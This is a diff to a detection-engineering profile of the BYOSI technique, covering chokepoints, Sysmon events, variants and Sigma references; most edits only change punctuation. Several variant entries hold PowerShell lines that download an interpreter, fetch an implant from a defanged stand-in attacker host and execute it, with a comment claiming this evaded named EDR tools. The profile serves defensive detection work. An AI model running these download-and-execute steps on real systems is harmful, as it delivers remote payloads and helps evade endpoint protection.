@@ -36,29 +36,29 @@ Author: '@iimp0ster'
 Chokepoints:
 - Stage: Interpreter Deployment
   Input: Attacker has code execution on the target
-  Invariant: A non-default scripting interpreter runtime must be introduced to the system — either written to disk as a
+  Invariant: A non-default scripting interpreter runtime must be introduced to the system, either written to disk as a
     standalone binary or loaded in-memory as embedded DLLs within a .NET host process (IronPython, Boolang)
   Observable: 'Disk-based: Sysmon EID 11 showing a vendor-signed interpreter binary (python.exe, php.exe, node.exe) written
     to a user-writable directory. In-memory: Sysmon EID 7 showing interpreter DLLs (IronPython.dll, Microsoft.Scripting.dll)
     loaded by a .NET host process.'
-  WhyCantBypass: The interpreter runtime is required to parse and execute scripts — it cannot be replaced by a native OS
+  WhyCantBypass: The interpreter runtime is required to parse and execute scripts. It cannot be replaced by a native OS
     component without losing language compatibility. Whether deployed as a binary or embedded DLLs, the runtime must be present.
   LogSources:
   - Sysmon Event ID 11 (File Create)
-  - Sysmon Event ID 1 (Process Creation — archive extraction)
+  - Sysmon Event ID 1 (Process Creation, archive extraction)
   - Windows Security Event ID 4688 (Process Creation)
   DetectionTier: Research
   SigmaRef: sigma-rules/byosi/research.yml
 - Stage: Interpreter Execution
-  Input: Interpreter runtime is available — either as a binary on disk or as embedded DLLs in a host process
+  Input: Interpreter runtime is available, either as a binary on disk or as embedded DLLs in a host process
   Invariant: The non-default interpreter binary must be launched as a new process to run attacker scripts.
   Observable: 'Sysmon EID 1 showing python.exe, node.exe, php.exe, etc. running from a non-standard path
     (not Program Files). Command line may reveal the script being executed or inline code.'
-  WhyCantBypass: Script files require their matching interpreter process to execute — there is no way to run Python/PHP/Node scripts without spawning the interpreter.
+  WhyCantBypass: Script files require their matching interpreter process to execute. There is no way to run Python/PHP/Node scripts without spawning the interpreter.
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
   - Windows Security Event ID 4688 (Process Creation)
-  - Sysmon Event ID 7 (Image Loaded — interpreter DLLs)
+  - Sysmon Event ID 7 (Image Loaded, interpreter DLLs)
   DetectionTier: Hunt
   SigmaRef: sigma-rules/byosi/hunt.yml
 - Stage: Malicious Script Action
@@ -66,7 +66,7 @@ Chokepoints:
   Invariant: The interpreter must load attacker-controlled script content and perform an observable action (network connection, file write, process spawn, credential access).
   Observable: 'Sysmon EID 3 showing outbound connections from the interpreter process. EID 1 showing child processes
     spawned by the interpreter. EID 11/12/13 showing file or registry modifications.'
-  WhyCantBypass: The script must interact with the OS to achieve its objective — C2 callbacks require network, data theft requires file/process access, persistence requires registry/filesystem writes.
+  WhyCantBypass: The script must interact with the OS to achieve its objective. C2 callbacks require network, data theft requires file/process access, persistence requires registry/filesystem writes.
   LogSources:
   - Sysmon Event ID 3 (Network Connection)
   - Sysmon Event ID 1 (Child Process Creation)
@@ -90,7 +90,7 @@ Variations:
     unable to scan PHP file types.
   VariantId: byosi-php-shell
   Command:
-    Invocation: "# Four lines of PowerShell — evaded CrowdStrike, Trellix, SentinelOne:\nInvoke-WebRequest -Uri \"hxxps[://]windows.php.net/downloads/releases/php-8.2.0-nts-Win32-vs16-x64.zip\" -OutFile \"$env:TEMP\\php.zip\"\nExpand-Archive \"$env:TEMP\\php.zip\" -DestinationPath \"C:\\Temp\\php\"\nInvoke-WebRequest -Uri \"hxxps[://]attacker[.]com/implant.php\" -OutFile \"C:\\Temp\\php\\shell.php\"\nC:\\Temp\\php\\php.exe C:\\Temp\\php\\shell.php"
+    Invocation: "# Four lines of PowerShell. Evaded CrowdStrike, Trellix, SentinelOne:\nInvoke-WebRequest -Uri \"hxxps[://]windows.php.net/downloads/releases/php-8.2.0-nts-Win32-vs16-x64.zip\" -OutFile \"$env:TEMP\\php.zip\"\nExpand-Archive \"$env:TEMP\\php.zip\" -DestinationPath \"C:\\Temp\\php\"\nInvoke-WebRequest -Uri \"hxxps[://]attacker[.]com/implant.php\" -OutFile \"C:\\Temp\\php\\shell.php\"\nC:\\Temp\\php\\php.exe C:\\Temp\\php\\shell.php"
     Context: 'Original BYOSI PoC. Downloads official PHP for Windows, extracts to C:\Temp\php, fetches PHP implant, executes. SentinelOne confirmed unable to scan PHP file types.'
     Artifacts:
     - 'Sysmon EID 11: php.exe written to C:\Temp\php\'
@@ -108,7 +108,7 @@ Variations:
   VariantId: polydrop-multi-language
   Command:
     Invocation: "# Supports 13 languages. Example with Ruby:\nInvoke-WebRequest -Uri \"hxxps[://]github.com/.../rubyinstaller-3.2.2-1-x64.exe\" -OutFile \"$env:TEMP\\ruby.exe\"\nStart-Process \"$env:TEMP\\ruby.exe\" -ArgumentList \"/silent\" -Wait\nInvoke-WebRequest -Uri \"hxxps[://]attacker[.]com/payload.rb\" -OutFile \"$env:TEMP\\payload.rb\"\nruby.exe \"$env:TEMP\\payload.rb\""
-    Context: 'Expanded BYOSI toolkit supporting 13 languages. Each interpreter is legitimately signed — EDR trusts the binary, cannot scan the script.'
+    Context: 'Expanded BYOSI toolkit supporting 13 languages. Each interpreter is legitimately signed. EDR trusts the binary and cannot scan the script.'
     Artifacts:
     - 'Sysmon EID 11: Non-default interpreter binary written to TEMP/AppData'
     - 'Sysmon EID 1: Interpreter running from non-standard path'
@@ -125,7 +125,7 @@ Variations:
     without touching PowerShell.
   VariantId: ironnetinjector-turla-ironpython
   Command:
-    Invocation: "# IronPython embedded via .NET:\n# Malicious Python scripts loaded into memory via IronPython runtime\n# No python.exe on disk — uses .NET-hosted IronPython DLLs\n# Injects Turla tools into legitimate processes"
+    Invocation: "# IronPython embedded via .NET:\n# Malicious Python scripts loaded into memory via IronPython runtime\n# No python.exe on disk. Uses .NET-hosted IronPython DLLs\n# Injects Turla tools into legitimate processes"
     Context: 'Turla APT. Uses IronPython via .NET to avoid dropping python.exe. Loads malicious .py scripts in memory. Documented by Unit 42.'
     Artifacts:
     - 'Sysmon EID 7: IronPython DLLs loaded (IronPython.dll, Microsoft.Scripting.dll)'
@@ -196,7 +196,7 @@ Variations:
   VariantId: byoi-dotnet-embedded-interpreters
   Command:
     Invocation: "# .NET application embeds Boolang or IronPython runtime:\n# No standalone interpreter binary on disk\n# Scripts loaded from embedded resources or fetched remotely\n# Executes within the .NET host process"
-    Context: 'Interpreter embedded within .NET application — no standalone binary to detect on disk. Scripts execute within the .NET host process memory.'
+    Context: 'Interpreter embedded within .NET application. No standalone binary to detect on disk. Scripts execute within the .NET host process memory.'
     Artifacts:
     - 'Sysmon EID 7: Boolang or IronPython DLLs loaded by .NET process'
     - 'Sysmon EID 1: .NET host with interpreter-related assemblies'
@@ -224,18 +224,6 @@ Prerequisites:
 - The scripting interpreter must be a legitimately signed binary compatible with the target OS
 - Attacker-controlled script content must be accessible to the interpreter (local file, inline argument, or remote fetch)
 - No application whitelisting policy blocking execution of the specific interpreter binary from non-standard paths
-AttackerControls:
-- Choice of interpreter (Python, PHP, Node.js, Ruby, Perl, AutoHotKey)
-- Obfuscation of the script payload
-- Script content and payload
-- Delivery method for the interpreter
-- Persistence mechanism for the interpreter
-AttackerCannotControl:
-- Must introduce a non-default interpreter runtime (binary on disk or DLLs loaded in-memory)
-- Must launch the interpreter process or load interpreter DLLs into a host
-- Interpreter binary/DLLs are vendor-signed (legitimate code)
-- Process creation or DLL load event logs the non-standard interpreter
-- Network connections from the interpreter are logged
 
 EvolutionTimeline:
 - Date: 2019-Q3
@@ -349,7 +337,7 @@ Detections:
   ExpectedFPRate: Medium
   UseCase: >
     Active threat hunting for BYOSI deployment. Correlates interpreter execution with
-    script loading or network callback — the two behaviors that distinguish malicious
+    script loading or network callback, the two behaviors that distinguish malicious
     from benign interpreter presence.
   SigmaRule: sigma-rules/byosi/hunt.yml
 
@@ -443,7 +431,7 @@ OsintSources:
   Query: 'filename:php.exe OR filename:node.exe OR filename:python.exe OR filename:ruby.exe'
   URL: https://urlscan.io/search/#filename%3Aphp.exe%20OR%20filename%3Anode.exe%20OR%20filename%3Apython.exe%20OR%20filename%3Aruby.exe
   Notes: >
-    Finds websites hosting interpreter binaries packaged in ZIP archives — a common
+    Finds websites hosting interpreter binaries packaged in ZIP archives, a common
     BYOSI delivery mechanism. Cross-reference with known malware distribution domains.
 
 References:
